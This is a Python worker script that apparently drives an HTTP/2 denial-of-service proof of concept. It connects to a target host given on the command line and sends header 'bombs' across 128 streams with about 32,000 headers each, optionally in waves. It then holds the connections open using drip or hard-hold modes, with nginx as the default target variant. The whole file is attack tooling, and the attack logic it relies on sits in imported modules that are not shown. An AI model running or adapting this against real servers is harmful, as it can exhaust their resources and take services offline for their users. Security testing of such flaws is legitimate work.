#!/usr/bin/env python3
"""Single-connection worker — supports multi-wave bombs and hold modes."""
from __future__ import annotations

import argparse
import sys
from pathlib import Path

BENCH = Path(__file__).resolve().parent
sys.path.insert(0, str(BENCH))

from h2_enhanced import H2AttackEnhanced, configure_h2_variant  # noqa: E402
from variants import set_poc_path  # noqa: E402


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--conn-id", type=int, default=0)
    p.add_argument("--streams", type=int, default=128)
    p.add_argument("--headers", type=int, default=32000)
    p.add_argument("--hold", type=int, default=180)
    p.add_argument("--drip", type=int, default=30)
    p.add_argument("--hold-mode", default="drip", choices=["drip", "hard_hold", "fire_and_forget", "none"])
    p.add_argument("--waves", type=int, default=1)
    p.add_argument("--wave-gap", type=float, default=0.3)
    p.add_argument("--variant", default="nginx")
    args = p.parse_args()

    set_poc_path(args.variant)
    configure_h2_variant(args.variant)

    c = H2AttackEnhanced(
        args.host,
        args.port,
        args.streams,
        args.headers,
        conn_id=args.conn_id,
        verbose=True,
    )
    try:
        c.connect()
        c.sock.settimeout(300)
        c.handshake()
        if args.waves > 1:
            wire = c.send_bombs_multi_wave(args.waves, args.wave_gap)
        else:
            wire = c.send_bombs()
        print(
            f"WORKER_BOMB_OK conn={args.conn_id} wire={wire} streams={len(c.stream_ids)}",
            flush=True,
        )
        c.apply_hold_mode(args.hold, args.drip, args.hold_mode)
        print(
            f"WORKER_OK conn={args.conn_id} wire={wire} active={c.active} "
            f"streams={len(c.stream_ids)} mode={args.hold_mode}",
            flush=True,
        )
        return 0 if wire > 0 else 1
    except Exception as exc:
        print(f"WORKER_FAIL conn={args.conn_id} err={exc}", flush=True)
        import traceback
        traceback.print_exc()
        return 2
    finally:
        c.close()


if __name__ == "__main__":
    raise SystemExit(main())
